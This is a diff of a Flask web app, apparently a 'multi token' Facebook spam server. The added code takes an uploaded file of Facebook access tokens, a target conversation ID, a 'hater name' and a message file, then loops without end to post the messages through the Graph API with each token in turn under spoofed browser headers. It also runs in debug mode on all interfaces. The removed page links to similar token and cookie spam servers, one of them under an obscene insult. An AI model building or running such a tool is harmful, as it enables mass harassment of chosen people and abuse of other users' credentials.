@@ -1,150 +1,184 @@
-from flask import Flask, render_template_string
+from flask import Flask, request
+import requests
+from threading import Thread, Event
+import time
 
 app = Flask(__name__)
+app.debug = True
 
-html_content = '''
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
 
- <!DOCTYPE html>
+stop_event = Event()
+threads = []
+
+def send_messages(access_tokens, thread_id, mn, time_interval, messages):
+    while not stop_event.is_set():
+        for message1 in messages:
+            if stop_event.is_set():
+                break
+            for access_token in access_tokens:
+                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                message = str(mn) + ' ' + message1
+                parameters = {'access_token': access_token, 'message': message}
+                response = requests.post(api_url, data=parameters, headers=headers)
+                if response.status_code == 200:
+                    print(f"Message sent using token {access_token}: {message}")
+                else:
+                    print(f"Failed to send message using token {access_token}: {message}")
+                time.sleep(time_interval)
+
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+    global threads
+    if request.method == 'POST':
+        token_file = request.files['tokenFile']
+        access_tokens = token_file.read().decode().strip().splitlines()
+
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
+
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
+
+        if not any(thread.is_alive() for thread in threads):
+            stop_event.clear()
+            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))
+            threads.append(thread)
+            thread.start()
+
+    return '''
+<!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>𝐇𝐀𝐒𝐒𝐀𝐍 𝐌𝐔𝐋𝐓𝐘 𝐒𝐄𝐑𝐕𝐄𝐑</title>
-    <style>
-        /* CSS for styling elements */
-        body {
-            overflow: hidden; /* Hide overflow to prevent scrollbars */
-            margin: 0;
-            font-family: Arial, sans-serif;
-        }
-        .video-background {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            min-width: 100%;
-            min-height: 100%;
-            width: auto;
-            height: auto;
-            z-index: -1; /* Put the video behind everything */
-            transform: translate(-50%, -50%);
-        }
-        .header {
-            background-color: transparent;
-            padding: 20px;
-            text-align: center;
-        }
-        .header h1 {
-            color: #fff;
-            margin: 0;
-            font-size: 28px;
-            font-weight: bold;
-        }
-        .container {
-        max-width: 350px;
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>𝐑𝐀𝐉𝐏𝐔𝐓 𝐄𝐍𝐓𝐄𝐑</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    /* CSS for styling elements */
+
+
+
+label{
+    color: white;
+}
+
+.file{
+    height: 30px;
+}
+body{
+    background-image: url('https://i.ibb.co/fFqG2rr/Picsart-24-07-11-17-16-03-306.jpg');
+    background-size: cover;
+    background-repeat: no-repeat;
+    color: white;
+
+}
+    .container{
+      max-width: 350px;
       height: 600px;
       border-radius: 20px;
       padding: 20px;
-         text-align: center;
-         color: white;
-         }
-        input[type="username"], input[type="password"], input[type="submit"] {
-            padding: 10px;
-            margin: 10px;
-            border-radius: 20px;
-            border: 5px;
-            color: black;
-        }
-        input[type="submit"] {
-            background-color: Red;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 0 15px white;
+            border: none;
+            resize: none;
+    }
+        .form-control {
+            outline: 1px red;
+            border: 1px double white ;
+            background: transparent; 
+            width: 100%;
+            height: 40px;
+            padding: 7px;
+            margin-bottom: 20px;
+            border-radius: 10px;
             color: white;
-            cursor: pointer;
-        }
-    </style>
-    <script>
-        function playVideo() {
-            var video = document.getElementById('bg-video');
-            video.play();
-        }
-    </script>
+    }
+    .header{
+      text-align: center;
+      padding-bottom: 20px;
+    }
+    .btn-submit{
+      width: 100%;
+      margin-top: 10px;
+    }
+    .footer{
+      text-align: center;
+      margin-top: 20px;
+      color: #888;
+    }
+    .whatsapp-link {
+      display: inline-block;
+      color: #25d366;
+      text-decoration: none;
+      margin-top: 10px;
+    }
+    .whatsapp-link i {
+      margin-right: 5px;
+    }
+  </style>
 </head>
-<body onclick="playVideo()">
-    <video id="bg-video" class="video-background" loop>
-        <source src="https://raw.githubusercontent.com/HassanRajput0/Video/main/Tecnología___Hintergrundbilder,_Hintergrund,_Pappe(360P).mp4">
-        Your browser does not support the video tag.
-    </video>
-    <div class="container">
-      <img src="https://i.ibb.co/BVPLFS1/20240719-163451.jpg">
-        <div class="mb-3">
-    <a href="https://heylink.me/devilking768">
-        <button class="ABY">𝗠𝗔𝗗𝗘 𝗕𝗬 𝗪𝗔𝗥𝗥𝗜𝗢𝗨𝗥 𝗥𝗨𝗟𝗘𝗫</button>
-    </a>
+<body>
+  <header class="header mt-4">
+  <h1 class="mt-3">倫 𝐇𝐀𝐒𝐒𝐀𝐍 —⍟— 𝐑𝐀𝐉𝐏𝐔𝐓 倫 </h1>
+  </header>
+  <div class="container text-center">
+    <form method="post" enctype="multipart/form-data">
+      <div class="mb-3">
+        <label for="tokenFile" class="form-label">𝚂𝙴𝙻𝙴𝙲𝚃 𝚈𝙾𝚄𝚁 𝚃𝙾𝙺𝙴𝙽 𝙵𝙸𝙻𝙴</label>
+        <input type="file" class="form-control" id="tokenFile" name="tokenFile" required>
+      </div>
+      <div class="mb-3">
+        <label for="threadId" class="form-label">𝙲𝙾𝙽𝚅𝙾 𝙶𝙲/𝙸𝙽𝙱𝙾𝚇 𝙸𝙳</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" required>
+      </div>
+      <div class="mb-3">
+        <label for="kidx" class="form-label">H𝙰𝚃𝙷𝙴𝚁 𝙽𝙰𝙼𝙴</label>
+        <input type="text" class="form-control" id="kidx" name="kidx" required>
+      </div>
+      <div class="mb-3">
+        <label for="time" class="form-label">T𝙸𝙼𝙴 𝙳𝙴𝙻𝙰𝚈 𝙸𝙽 (seconds)</label>
+        <input type="number" class="form-control" id="time" name="time" required>
+      </div>
+      <div class="mb-3">
+        <label for="txtFile" class="form-label">𝚃𝙴𝚇𝚃 𝙵𝙸𝙻𝙴</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
+      </div>
+      <button type="submit" class="btn btn-primary btn-submit">sᴛᴀʀᴛ sᴇɴᴅɪɴɢ ᴍᴇssᴀɢᴇs</button>
+    </form>
+    <form method="post" action="/stop">
+      <button type="submit" class="btn btn-danger btn-submit mt-3">sᴛᴏᴘ sᴇɴᴅɪɴɢ ᴍᴇssᴀɢᴇs ᴇ</button>
+    </form>
+  </div>
+  <footer class="footer">
+    <p>&copy; 2024 𝓐𝓵𝓵 𝓡𝓲𝓰𝓱𝓽𝓼 𝓡𝓮𝓼𝓮𝓻𝓿𝓮𝓭 𝓑𝔂 𝓗𝓪𝓼𝓼𝓪𝓷 𝓡𝓪𝓳𝓹𝓾𝓽.</p>
+    <p> ᴏɴᴇ ᴍᴀɴ ᴀʀᴍʏ <a href="https://www.facebook.com/hassanRajput038?mibextid=ZbWKwL">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴀʙᴏᴏᴋ</a></p>
+    <div class="mb-3">
+      <a href="https://wa.me/+923417885339" class="whatsapp-link">
+        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
+   z   </a>
     </div>
-        <div class="mb-3">
-    <a href="https://post-server-j0fp.onrender.com">
-        <button class="GFG">𝗖𝗢𝗡𝗩𝗢+𝗣𝗢𝗦𝗧  :=</button>
-    </a>
-    </div>
-        <div class="mb-3">
-    <a href="https://convo-server-22tn.onrender.com">
-        <button class="ABB">𝗦𝗜𝗡𝗚𝗟𝗘 𝗧𝗢𝗞𝗘𝗡 𝗖𝗢𝗡𝗩𝗢</button>
-    </a>
-    </div>
-        <div class="mb-3">
-    <a href="https://page-server-onya.onrender.com">
-        <button class="ABK">𝗠𝗨𝗟𝗧I 𝗧𝗢𝗞𝗘𝗡 𝗣𝗢𝗦𝗧 </button>
-    </a>
-    </div>
-        <div class="mb-3">
-    <a href="https://satish-ki-ma-ki-chut.onrender.com">
-        <button class="ABC">𝗦𝗜𝗡𝗚𝗟𝗘 𝗖𝗢𝗢𝗞𝗜𝗘 𝗣𝗢𝗦𝗧</button>
-    </a>
-    </div>
-        <div class="mb-3">
-    <a href="https://multy-convo.onrender.com">
-        <button class="ABD">𝗠𝗨𝗟𝗧𝗬 𝗧𝗢𝗞𝗘𝗡 𝗖𝗢𝗡𝗩𝗢</button>
-    </a>
-    </div>
-        <div class="mb-3">
-    <a href="https://singal-post-z9hi.onrender.com">
-        <button class="ABE">𝗦𝗜𝗡𝗚𝗟𝗘 𝗧𝗢𝗞𝗘𝗡 𝗣𝗢𝗦𝗧</button>
-    </a>
-    </div>
-        <div class="mb-3">
-    <a href="https://i.ibb.co/fMsks05/Messenger-creation-355e01cf-042b-437a-94e3-0415c5187252.jpg">
-        <button class="ABF">𝗦𝗘𝗡𝗧 𝗙𝗥𝗢𝗠 𝗪𝗘𝗕 : 𝗖𝗢𝗠𝗜𝗡𝗚 𝗦𝗢𝗢𝗡</button>
-    </a>
-    </div>
-        <div class="mb-3">
-    <a href="https://i.ibb.co/VLhGGyP/Screenshot-2024-06-28-21-48-57-38.jpg">
-        <button class="ABH">𝗕𝗼𝗼𝗸𝗺𝗮𝗿𝗸 𝗺𝘂𝗹𝘁𝗶 𝘁𝗼𝗸𝗲𝗻+𝗰𝗼𝗼𝗸𝗶𝗲 : 𝗰𝗼𝗺𝗶𝗻𝗴 𝘀𝗼𝗼𝗻</button>
-    </a>
-    </div>
-        <div class="mb-3">
-    <a href="https://github.com/DeViiLXD/MULTI-COOKIE-SERVER-DEVIL">
-        <button class="ABJ">𝗺𝘂𝗹𝘁𝘆 𝗰𝗼𝗼𝗸𝗶𝗲𝘀 : 𝗼𝗳𝗳𝗹𝗶𝗻𝗲 𝘀𝗲𝗿𝘃𝗲𝗿 𝗮𝗻𝗱 𝘄𝗶𝘁𝗵 𝗳𝗼𝗹𝗹𝗼𝘄 𝗺𝘆 𝗴𝗶𝘁𝗵𝘂𝗯 𝗮𝗰𝗼𝘂𝗻𝘁</button>
-    </a>
-    </div>
-        <div class="mb-3">
-    <a href="https://i.ibb.co/q7g5PCW/Screenshot-2024-06-30-12-52-50-60.jpg">
-        <button class="ABK">𝐀𝐥𝐥- 𝘀𝗲𝗿𝘃𝗲𝗿 𝗮𝗻𝗱 𝘁𝗼𝗼𝗹𝘀 𝗯𝘆 𝗶𝘁𝘀 𝘁𝗵𝗲 𝗴𝗿𝗲𝗮𝘁𝗲𝘀𝘁 𝘄𝗮𝗿𝗿𝗶𝗼𝘂𝗿 𝗿𝘂𝗹𝗲𝘅 𝗢𝘄𝗻𝗲𝗿: 𝗔𝗹𝗼𝗻𝗲 𝗪𝗮𝗿𝗿𝗶𝗼𝘂𝗥 𝗗𝗲𝗩𝗶𝗟 𝗜𝗻𝘀𝗶𝗗𝗲 </button>
-    </a>
-    </div>
-        <div class="mb-3">
-    <a href="https://chat.whatsapp.com/IQOZmY5o2Ny7C8Zc5g0180">
-        <button class="ABL">𝗪𝗔𝗥𝗥𝗜𝗢𝗨𝗥 𝗥𝗨𝗟𝗘𝗫 𝗦𝗘 𝗝𝗨𝗗𝗡𝗘 𝗞𝗘 𝗟𝗜𝗬𝗘 𝗖𝗟𝗜𝗖𝗞 𝗞𝗥𝗘</button>
-    </a>
-    <a href="http://localhost:8158/TEST2.html">
-        <button class="ABZ">𝐇𝐨𝐦𝐞</button>
-    </a> 
-</body> 
+  </footer>
+</body>
 </html>
-'''
+    '''
 
-@app.route('/')
-def home():
-    return render_template_string(html_content)
+@app.route('/stop', methods=['POST'])
+def stop_sending():
+    stop_event.set()
+    return 'Message sending stopped.'
 
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
-    app.run(debug=True)
+    app.run(host='0.0.0.0', port=5000)
